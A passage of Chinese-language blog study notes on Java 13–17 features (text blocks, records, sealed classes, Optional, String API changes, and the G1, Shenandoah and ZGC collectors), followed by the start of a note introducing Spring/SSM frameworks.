<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&lt;html&gt;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;    &lt;body&gt;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;        &lt;p&gt;Hello, 尚硅谷&lt;/p&gt;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;    &lt;/body&gt;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;&lt;/html&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>即被自动进行了转义，这样的字符串看起来不是很直观，在JDK 13中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;Hello, world&lt;/p&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>普通多行文本，sql语句，json语句均可使用此方法</p>
<p><strong>JDK14中二次预览特性</strong><br>JDK14的版本主要增加了两个escape sequences，分别是<code> \ &lt;line-terminator&gt;</code>与<code>\s  escape sequence</code>。</p>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test5</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql1</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            SELECT id,NAME,email</span></span><br><span class="line"><span class="string">            FROM customers</span></span><br><span class="line"><span class="string">            WHERE id &gt; 4</span></span><br><span class="line"><span class="string">            ORDER BY email DESC</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>;</span><br><span class="line">    System.out.println(sql1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// \:取消换行操作</span></span><br><span class="line">    <span class="comment">// \s:表示一个空格</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql2</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            SELECT id,NAME,email \</span></span><br><span class="line"><span class="string">            FROM customers\s\</span></span><br><span class="line"><span class="string">            WHERE id &gt; 4 \</span></span><br><span class="line"><span class="string">            ORDER BY email DESC</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>;</span><br><span class="line">    System.out.println(sql2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>JDK15中功能转正</strong></p>
<h5 id="jdk14-15-16-record数据类型"><a href="#jdk14-15-16-record数据类型" class="headerlink" title="jdk14,15,16 record数据类型"></a>jdk14,15,16 record数据类型</h5><p><code>背景</code><br>开发人员想要创建纯数据载体类（plain data carriers）通常都必须编写大量低价值、重复的、容易出错的代码。如：构造函数、getter&#x2F;setter、equals()、hashCode()以及toString()等。以至于很多人选择使用IDE的功能来自动生成这些代码。还有一些开发会选择使用一些第三方类库，如Lombok等来生成这些方法。</p>
<p><strong>JDK14中预览特性：record</strong>实现一个简单的数据载体类，为了避免编写：构造函数，访问器，equals()，hashCode () ，toString ()等，Java 14推出record。</p>
<p><code>record</code> 是一种全新的类型，其父类是<code>java.lang.Record</code>，不可再继承父类，它本质上是一个 <code>final</code> 类，同时所有的属性都是 <code>final</code> 修饰，它会自动编译出 <code>public get</code> 、<code>hashcode</code> 、<code>equals</code>、<code>toString</code>、构造器等结构，减少了代码编写量。<br>具体来说：当你用<code>record</code> 声明一个类时，该类将自动拥有以下功能：</p>
<ul>
<li>获取成员变量的简单方法，比如例题中的 name() 和 partner() 。注意区别于我们平常getter()的写法。</li>
<li>一个 equals 方法的实现，执行比较时会比较该类的所有成员属性。</li>
<li>重写 hashCode() 方法。</li>
<li>一个可以打印该类所有成员属性的 toString() 方法。</li>
<li>只有一个构造方法。</li>
</ul>
<p>此外：</p>
<ul>
<li>还可以在record声明的类中定义<strong>静态字段、静态方法、构造器或实例方法</strong>。</li>
<li>不能在record声明的类中定义实例字段；类不能声明为abstract；不能声明显式的父类等。</li>
</ul>
<p>举例1（旧写法）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> y;</span><br><span class="line"></span><br><span class="line">    Point(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">x</span><span class="params">()</span> &#123;<span class="keyword">return</span> x;&#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">y</span><span class="params">()</span> &#123;<span class="keyword">return</span> y;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Point)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">Point</span> <span class="variable">other</span> <span class="operator">=</span> (Point) o;</span><br><span class="line">        <span class="keyword">return</span> other.x == x &amp;&amp; other.y == y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hash(x, y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Point&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;x=&quot;</span> + x +</span><br><span class="line">                <span class="string">&quot;, y=&quot;</span> + y +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Point</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123; &#125;</span><br></pre></td></tr></table></figure>

<p><strong>JDK15中第二次预览特性</strong><br><strong>JDK16中转正特性</strong></p>
<p><code>记录不适合哪些场景</code><br>record的设计目标是提供一种将数据建模为数据的好方法。它也不是 JavaBeans 的直接替代品，因为record的方法不符合 JavaBeans 的 get 标准。另外 JavaBeans 通常是可变的，而记录是不可变的。尽管它们的用途有点像，但记录并不会以某种方式取代 JavaBean。</p>
<h5 id="jdk15-16-17-密封类"><a href="#jdk15-16-17-密封类" class="headerlink" title="jdk15,16,17 密封类"></a>jdk15,16,17 密封类</h5><p>背景：</p>
<p>在 Java 中如果想让一个类不能被继承和修改，这时我们应该使用 <code>final</code> 关键字对类进行修饰。不过这种要么可以继承，要么不能继承(final修饰)的机制不够灵活，有些时候我们可能想让某个类可以被某些类型继承，但是又不能随意继承，是做不到的。Java 15 尝试解决这个问题，引入了 <code>sealed</code> 类，被 <code>sealed</code> 修饰的类可以指定子类。这样这个类就只能被指定的类继承。</p>
<p><strong>JDK15的预览特性：</strong><br>通过密封的类和接口来限制超类的使用，密封的类和接口限制其它可能继承或实现它们的其它类或接口。<br>具体使用：</p>
<ul>
<li>使用修饰符<code>sealed</code>，可以将一个类声明为密封类。密封的类使用保留关键字<code>permits</code>列出可以直接扩展（即extends）它的类。</li>
<li><code>sealed</code> 修饰的类的机制具有传递性，它的**子类必须使用(不可省略!)**指定的关键字进行修饰，且只能是 <code>final</code>、<code>sealed</code>、<code>non-sealed</code> 三者之一。</li>
</ul>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title class_">Shape</span> <span class="keyword">permits</span> Circle, Rectangle, Square &#123;...&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;...&#125; <span class="comment">//final表示Circle不能再被继承了</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> <span class="keyword">permits</span> TransparentRectangle, FilledRectangle &#123;...&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransparentRectangle</span> <span class="keyword">extends</span> <span class="title class_">Rectangle</span> &#123;...&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">FilledRectangle</span> <span class="keyword">extends</span> <span class="title class_">Rectangle</span> &#123;...&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">non-sealed</span> <span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;...&#125; <span class="comment">//non-sealed表示可以允许任何类继承，不可以省略</span></span><br></pre></td></tr></table></figure>

<p><strong>JDK16二次预览特性</strong><br><strong>JDK17中转正特性</strong></p>
<h4 id="jdk9-17-API"><a href="#jdk9-17-API" class="headerlink" title="jdk9-17 API"></a>jdk9-17 API</h4><h5 id="jdk8-Optional类"><a href="#jdk8-Optional类" class="headerlink" title="jdk8 Optional类"></a>jdk8 Optional类</h5><p><strong>JDK8的新特性</strong></p>
<p>到目前为止，臭名昭著的空指针异常是导致Java应用程序失败的最常见原因。以前，为了解决空指针异常，Google在著名的Guava项目引入了Optional类，通过检查空值的方式避免空指针异常。受到Google的启发，Optional类已经成为Java 8类库的一部分。<code>Optional&lt;T&gt;</code> 类(java.util.Optional) 是一个容器类，它可以保存类型T的值，代表这个值存在。或者仅仅保存null，表示这个值不存在。如果值存在，则isPresent()方法会返回true，调用get()方法会返回该对象。</p>
<p>Optional提供很多有用的方法，这样我们就不用显式进行空值检测。</p>
<ol>
<li><code>创建Optional类对象的方法：</code></li>
</ol>
<ul>
<li>static <T> Optional<T> empty() ：用来创建一个空的Optional实例</li>
<li>static <T> Optional<T> of(T value) ：用来创建一个Optional实例，value必须非空</li>
<li><code>static &lt;T&gt; Optional&lt;T&gt; ofNullable(T value)</code> ：用来创建一个Optional实例，value可能是空，也可能非空</li>
</ul>
<ol start="2">
<li><code>判断Optional容器中是否包含对象：</code></li>
</ol>
<ul>
<li>boolean isPresent() : 判断Optional容器中的值是否存在</li>
<li>void ifPresent(Consumer&lt;? super T&gt; consumer) ：判断Optional容器中的值是否存在，如果存在，就对它进行Consumer指定的操作，如果不存在就不做</li>
</ul>
<ol start="3">
<li><code>获取Optional容器的对象：</code></li>
</ol>
<ul>
<li>T get(): 如果调用对象包含值，返回该值。否则抛异常。T get()与of(T value)配合使用</li>
<li><code>T orElse(T other) </code>：orElse(T other) 与ofNullable(T value)配合使用，如果Optional容器中非空，就返回所包装值，如果为空，就用orElse(T other)other指定的默认值（备胎）代替</li>
<li>T orElseGet(Supplier&lt;? extends T&gt; other) ：如果Optional容器中非空，就返回所包装值，如果为空，就用Supplier接口的Lambda表达式提供的值代替</li>
<li>T orElseThrow(Supplier&lt;? extends X&gt; exceptionSupplier) ：如果Optional容器中非空，就返回所包装值，如果为空，就抛出你指定的异常类型代替原来的NoSuchElementException</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;lllll&quot;</span>;</span><br><span class="line">    string = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//1. 实例化</span></span><br><span class="line">    Optional&lt;String&gt; optional = Optional.ofNullable(string);</span><br><span class="line">    <span class="type">String</span> <span class="variable">string3</span> <span class="operator">=</span> <span class="string">&quot;ggggg&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">finallystr</span> <span class="operator">=</span> optional.orElse(string3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>这是JDK9-11的新特性</strong></p>
<table>
<thead>
<tr>
<th><strong>新增方法</strong></th>
<th><strong>描述</strong></th>
<th><strong>新增的版本</strong></th>
</tr>
</thead>
<tbody><tr>
<td>boolean isEmpty()</td>
<td>判断value是否为空</td>
<td>JDK  11</td>
</tr>
<tr>
<td>ifPresentOrElse(Consumer&lt;? super T&gt; action, Runnable emptyAction)</td>
<td>value非空，执行参数1功能；如果value为空，执行参数2功能</td>
<td>JDK  9</td>
</tr>
<tr>
<td>Optional<T> or(Supplier&lt;? extends Optional&lt;? extends T&gt;&gt; supplier)</td>
<td>value非空，返回对应的Optional；value为空，返回形参封装的Optional</td>
<td>JDK  9</td>
</tr>
<tr>
<td>Stream<T> stream()</td>
<td>value非空，返回仅包含此value的Stream；否则，返回一个空的Stream</td>
<td>JDK  9</td>
</tr>
<tr>
<td>T orElseThrow()</td>
<td>value非空，返回value；否则抛异常NoSuchElementException</td>
<td>JDK  10</td>
</tr>
</tbody></table>
<h5 id="jdk9-（了解）String存储结构和API变更"><a href="#jdk9-（了解）String存储结构和API变更" class="headerlink" title="jdk9+（了解）String存储结构和API变更"></a>jdk9+（了解）String存储结构和API变更</h5><p><strong>这是JDK9的新特性。</strong><br>String 再也不用 char[] 来存储啦，改成了 byte[] 加上编码标记，节约了一些空间。</p>
<p>拓展：StringBuffer 与 StringBuilder<br>那StringBuffer 和 StringBuilder 是否仍无动于衷呢？</p>
<blockquote>
<p>String-related classes such as AbstractStringBuilder, StringBuilder, and StringBuffer will be updated to use the same representation, as will the HotSpot VM’s intrinsic string operations.</p>
</blockquote>
<p><strong>JDK11新特性：新增了一系列字符串处理方法</strong></p>
<table>
<thead>
<tr>
<th><strong>描述</strong></th>
<th><strong>举例</strong></th>
</tr>
</thead>
<tbody><tr>
<td>判断字符串是否为空白</td>
<td>“  “.isBlank(); &#x2F;&#x2F; true</td>
</tr>
<tr>
<td>去除首尾空白</td>
<td>“  Javastack “.strip(); &#x2F;&#x2F; “Javastack”</td>
</tr>
<tr>
<td>去除尾部空格</td>
<td>“  Javastack “.stripTrailing(); &#x2F;&#x2F; “ Javastack”</td>
</tr>
<tr>
<td>去除首部空格</td>
<td>“  Javastack “.stripLeading(); &#x2F;&#x2F; “Javastack “</td>
</tr>
<tr>
<td>复制字符串</td>
<td>“Java”.repeat(3);&#x2F;&#x2F;  “JavaJavaJava”</td>
</tr>
<tr>
<td>行数统计</td>
<td>“A\nB\nC”.lines().count();  &#x2F;&#x2F; 3</td>
</tr>
</tbody></table>
<p><strong>JDK12新特性：String 实现了 Constable 接口</strong></p>
<p>String源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">String</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable, Comparable&lt;String&gt;, CharSequence,Constable, ConstantDesc &#123;</span><br></pre></td></tr></table></figure>

<p>java.lang.constant.Constable接口定义了抽象方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Constable</span> &#123;</span><br><span class="line">	Optional&lt;? <span class="keyword">extends</span> <span class="title class_">ConstantDesc</span>&gt; describeConstable();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Java 12 String 的实现源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns an &#123;<span class="doctag">@link</span> Optional&#125; containing the nominal descriptor for this</span></span><br><span class="line"><span class="comment"> * instance, which is the instance itself.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> an &#123;<span class="doctag">@link</span> Optional&#125; describing the &#123;<span class="doctag">@linkplain</span> String&#125; instance</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Optional&lt;String&gt; <span class="title function_">describeConstable</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> Optional.of(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单，其实就是调用 Optional.of 方法返回一个 Optional 类型。</p>
<p><strong>JDK12新特性：String新增方法</strong></p>
<p>String的transform(Function)</p>
<h5 id="JDK17-标记删除Applet-API"><a href="#JDK17-标记删除Applet-API" class="headerlink" title="JDK17 标记删除Applet API"></a>JDK17 标记删除Applet API</h5><p>Applet API 提供了一种将 Java AWT&#x2F;Swing 控件嵌入到浏览器网页中的方法。不过，目前 Applet 已经被淘汰。大部分人可能压根就没有用过 Applet。Applet API 实际上是无用的，因为所有 Web 浏览器供应商都已删除或透露计划放弃对 Java 浏览器插件的支持。Java 9 的时候，Applet API 已经被标记为过时，Java 17 的时候终于标记为删除了。</p>
<p>具体如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.applet.Applet</span><br><span class="line">java.applet.AppletStub</span><br><span class="line">java.applet.AppletContext</span><br><span class="line">java.applet.AudioClip</span><br><span class="line">javax.swing.JApplet</span><br><span class="line">java.beans.AppletInitializer</span><br></pre></td></tr></table></figure>

<h4 id="其它结构变化"><a href="#其它结构变化" class="headerlink" title="其它结构变化"></a>其它结构变化</h4><h5 id="JDK9：UnderScore-下划线-使用的限制"><a href="#JDK9：UnderScore-下划线-使用的限制" class="headerlink" title="JDK9：UnderScore(下划线)使用的限制"></a>JDK9：UnderScore(下划线)使用的限制</h5><p>在java 8 中，标识符可以独立使用“_”来命名：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">_</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">System.out.println(_);</span><br></pre></td></tr></table></figure>
<p>但是，在java 9 中规定“_”不再可以单独命名标识符了，如果使用，会报错：</p>
<h5 id="JDK11：更简化的编译运行程序"><a href="#JDK11：更简化的编译运行程序" class="headerlink" title="JDK11：更简化的编译运行程序"></a>JDK11：更简化的编译运行程序</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">javac JavaStack.java</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">java JavaStack</span><br></pre></td></tr></table></figure>

<p>我们的认知里，要运行一个 Java 源代码必须先编译，再运行。而在 Java 11 版本中，通过一个 java 命令就直接搞定了，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java JavaStack.java</span><br></pre></td></tr></table></figure>
<p>注意点：</p>
<ul>
<li>执行源文件中的第一个类，第一个类必须包含主方法。</li>
</ul>
<h5 id="GC方面新特性"><a href="#GC方面新特性" class="headerlink" title="GC方面新特性"></a>GC方面新特性</h5><p>GC是Java主要优势之一。 然而，当GC停顿太长，就会开始影响应用的响应时间。随着现代系统中内存不断增长，用户和程序员希望JVM能够以高效的方式充分利用这些内存， 并且无需长时间的GC暂停时间。</p>
<h6 id="G1-GC"><a href="#G1-GC" class="headerlink" title="G1 GC"></a>G1 GC</h6><p>JDK9以后默认的垃圾回收器是G1GC。</p>
<p><strong>JDK10 : 为G1提供并行的Full GC</strong></p>
<p>G1最大的亮点就是可以尽量的避免full gc。但毕竟是“尽量”，在有些情况下，G1就要进行full gc了，比如如果它无法足够快的回收内存的时候，它就会强制停止所有的应用线程然后清理。</p>
<p>在Java10之前，一个单线程版的标记-清除-压缩算法被用于full gc。为了尽量减少full gc带来的影响，在Java10中，就把之前的那个单线程版的标记-清除-压缩的full gc算法改成了支持多个线程同时full gc。这样也算是减少了full gc所带来的停顿，从而提高性能。</p>
<p>你可以通过<code>-XX:ParallelGCThreads</code>参数来指定用于并行GC的线程数。</p>
<p><strong>JDK12：可中断的 G1 Mixed GC</strong><br><strong>JDK12：增强G1，自动返回未用堆内存给操作系统</strong></p>
<h6 id="Shenandoah-GC"><a href="#Shenandoah-GC" class="headerlink" title="Shenandoah GC"></a>Shenandoah GC</h6><p><strong>JDK12：Shenandoah GC：低停顿时间的GC</strong></p>
<p>Shenandoah 垃圾回收器是 Red Hat 在 2014 年宣布进行的一项垃圾收集器研究项目 Pauseless GC 的实现，旨在<strong>针对 JVM 上的内存收回实现低停顿的需求</strong>。<br>据 Red Hat 研发 Shenandoah 团队对外宣称，Shenandoah 垃圾回收器的暂停时间与堆大小无关，这意味着无论将堆设置为 200 MB 还是 200 GB，都将拥有一致的系统暂停时间，不过实际使用性能将取决于实际工作堆的大小和工作负载。<br>Shenandoah GC 主要目标是 99.9% 的暂停小于 10ms，暂停与堆大小无关等。<br>这是一个实验性功能，不包含在默认（Oracle）的OpenJDK版本中。</p>
<p><strong>JDK15：Shenandoah垃圾回收算法转正</strong></p>
<p>Shenandoah垃圾回收算法终于从实验特性转变为产品特性，这是一个从 JDK 12 引入的回收算法，该算法通过与正在运行的 Java 线程同时进行疏散工作来减少 GC 暂停时间。Shenandoah 的暂停时间与堆大小无关，无论堆栈是 200 MB 还是 200 GB，都具有相同的一致暂停时间。<br>Shenandoah在JDK12被作为experimental引入，在JDK15变为Production；之前需要通过<code>-XX:+UnlockExperimentalVMOptions</code> <code>-XX:+UseShenandoahGC</code>来启用，现在只需要<code>-XX:+UseShenandoahGC</code>即可启用</p>
<h6 id="革命性的-ZGC"><a href="#革命性的-ZGC" class="headerlink" title="革命性的 ZGC"></a>革命性的 ZGC</h6><p><strong>JDK11：引入革命性的 ZGC</strong></p>
<p>ZGC，这应该是JDK11最为瞩目的特性，没有之一。<br>ZGC是一个并发、基于region、压缩型的垃圾收集器。<br>ZGC的设计目标是：支持TB级内存容量，暂停时间低（&lt;10ms），对整个程序吞吐量的影响小于15%。 将来还可以扩展实现机制，以支持不少令人兴奋的功能，例如多层堆（即热对象置于DRAM和冷对象置于NVMe闪存），或压缩堆。</p>
<p><strong>JDK13：ZGC:将未使用的堆内存归还给操作系统</strong><br><strong>JDK14：ZGC on macOS和windows</strong></p>
<ul>
<li><p>JDK14之前，ZGC仅Linux才支持。现在mac或Windows上也能使用ZGC了，示例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-XX:+UnlockExperimentalVMOptions -XX:+UseZGC</span><br></pre></td></tr></table></figure></li>
<li><p>ZGC与Shenandoah目标高度相似，在尽可能对吞吐量影响不大的前提下，实现在任意堆内存大小下都可以把垃圾收集的停顿时间限制在<code>十毫秒以内</code>的低延迟。</p>
</li>
</ul>
<p><strong>JDK15：ZGC 功能转正</strong><br>ZGC是Java 11引入的新的垃圾收集器，经过了多个实验阶段，自此终于成为正式特性。<br>但是这并不是替换默认的GC，默认的GC仍然还是G1；之前需要通过<code>-XX:+UnlockExperimentalVMOptions</code>、<code> -XX:+UseZGC</code>来启用ZGC，现在只需要<code>-XX:+UseZGC</code>就可以。相信不久的将来它必将成为默认的垃圾回收器。</p>
<blockquote>
<p>ZGC的性能已经相当亮眼，用“令人震惊、革命性”来形容，不为过。未来将成为服务端、大内存、低延迟应用的首选垃圾收集器。</p>
</blockquote>
<p>怎么形容Shenandoah和ZGC的关系呢？异同点大概如下：</p>
<ul>
<li>相同点：性能几乎可认为是相同的</li>
<li>不同点：ZGC是Oracle JDK的，根正苗红。而Shenandoah只存在于OpenJDK中，因此使用时需注意你的JDK版本</li>
</ul>
<p><strong>JDK16：ZGC 并发线程处理</strong></p>
<p>在线程的堆栈处理过程中，总有一个制约因素就是safepoints。在safepoints这个点，Java的线程是要暂停执行的，从而限制了GC的效率。</p>
<blockquote>
<p>我们都知道，在之前，需要 GC 的时候，为了进行垃圾回收，需要所有的线程都暂停下来，这个暂停的时间我们称为 <strong>Stop The World</strong>。<br>而为了实现 STW 这个操作， JVM 需要为每个线程选择一个点停止运行，这个点就叫做<strong>安全点（Safepoints）</strong>。<br>而ZGC的并发线程堆栈处理可以保证Java线程可以在GC safepoints的同时可以并发执行。它有助于提高所开发的Java软件应用程序的性能和效率。</p>
</blockquote>
<h4 id="小结与展望"><a href="#小结与展望" class="headerlink" title="小结与展望"></a>小结与展望</h4><p>随着云计算和 AI 等技术浪潮，当前的计算模式和场景正在发生翻天覆地的变化，不仅对 Java 的发展速度提出了更高要求，也深刻影响着 Java 技术的发展方向。<strong>传统的大型企业或互联网应用，正在被云端、容器化应用、模块化的微服务甚至是函数(FaaS， Function-as-a-Service)所替代。</strong><br><strong>Java 需要在新的计算场景下，改进开发效率。</strong>比如，Java 代码虽然进行了一些类型推断等改进，更易用的集合 API 等，但仍然给开发者留下了过于刻板、形式主义的印象，这是一个长期的改进方向。<br>Java虽然标榜面向对象编程，却毫不顾忌的加入<code>面向接口编程思想</code>，又扯出<code>匿名对象</code>的概念，每增加一个新的东西，对Java的根本（面向对象思想）的一次冲击。</p>
]]></content>
      <categories>
        <category>Java</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-SSM-Spring</title>
    <url>/2024/08/16/Java-SSM-Spring/</url>
    <content><![CDATA[<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><h2 id="笔记说明"><a href="#笔记说明" class="headerlink" title="笔记说明"></a>笔记说明</h2><h3 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h3><p>（1）IDEA开发工具：2022.1.2<br>（2）JDK：Java17<strong>（Spring6要求JDK最低版本是Java17）</strong><br>（3）Spring：6.0.2</p>
<p>（4）Maven：3.6+</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><strong>主要参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1AP411s7D7/?spm_id_from=333.1387.search.video_card.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-SSM</a></p>
<p><a href="https://www.runoob.com/w3cnote/basic-knowledge-summary-of-spring.html">菜鸟教程-Spring</a></p>
<p><a href="https://spring.io/projects/spring-framework">SpringFramework官方文档</a></p>
<p><a href="https://spring.io/guides">Spring官方导引</a></p>
<p><strong>其他参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1Vf4y127N5/?spm_id_from=333.1387.search.video_card.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-Spring5</a></p>
<p><a href="https://www.bilibili.com/video/BV1kR4y1b7Qc?vd_source=20530c92c1be8bd70e37346e3a5c037a&p=2&spm_id_from=333.788.player.switch">尚硅谷-Spring6</a></p>
<h2 id="技术体系结构"><a href="#技术体系结构" class="headerlink" title="技术体系结构"></a>技术体系结构</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240816124456.png"></p>
<h3 id="总体技术体系"><a href="#总体技术体系" class="headerlink" title="总体技术体系"></a>总体技术体系</h3><p><strong>单一架构</strong><br>一个项目，一个工程，导出为一个war包，在一个Tomcat上运行。也叫all in one。<br>主要应用技术框架为：Spring , SpringMVC , Mybatis。</p>
<p><strong>分布式架构</strong><br>一个项目（对应 IDEA 中的一个 project），拆分成很多个模块，每个模块是一个 IDEA 中的一个module。每一个工程都是运行在自己的Tomcat上。模块之间可以互相调用。每一个模块内部可以看成是一个单一架构的应用<br>主要应用技术框架：SpringBoot (SSM), SpringCloud , 中间件等</p>
<h3 id="框架的理解"><a href="#框架的理解" class="headerlink" title="框架的理解"></a>框架的理解</h3><p>框架( Framework )是一个集成了基本结构、规范、设计模式、编程语言和程序库等基础组件的软件系统，它可以用来构建更高级别的应用程序。框架的设计和实现旨在解决特定领域中的常见问题，帮助开发人员更高效、更稳定地实现软件开发目标。</p>
<p>&#x3D;&#x3D;》<strong>JAVA框架实际上就是一个集成了JAVA中常见问题的解决方案的程序集合。</strong><br>&#x3D;&#x3D;》 <code>框架 = jar包 + 配置文件</code></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240816131256.png" alt="文件结构角度理解框架"></p>
<p>框架的优点包括以下几点：</p>
<ol>
<li><code>提高开发效率</code>：框架提供了许多预先设计好了的组件和工具，能够帮助开发人员快速进行开发。相较于传统手写代码，在框架提供的规范化环境中，开发者可以更快地实现项目的各种要求。</li>
<li><code>降低开发成本</code>：框架的提供标准化的编程语言、数据操作等代码片段，避免了重复开发的问题，降低了开发成本，提供深度优化的系统，降低了维护成本，增强了系统的可靠性。</li>
<li><code>提高应用程序的稳定性</code>：框架通常经过了很长时间的开发和测试，其中的许多组件、代码片段和设计模式都得到了验证。重复利用这些组件有助于减少bug的出现，从而提高了应用程序的稳定性。</li>
<li><code>提供标准化的解决方案</code>：框架通常是针对某个特定领域的，通过提供标准化的解决方案，可以为开发人员提供一种共同的语言和思想基础，有助于更好地沟通和协作。</li>
</ol>
<p>框架的缺点包括以下几个方面：</p>
<ol>
<li><code>学习成本高</code>：框架通常具有特定的语言和编程范式。对于开发人员而言，需要花费时间学习其背后的架构、模式和逻辑，这对于新手而言可能会耗费较长时间。</li>
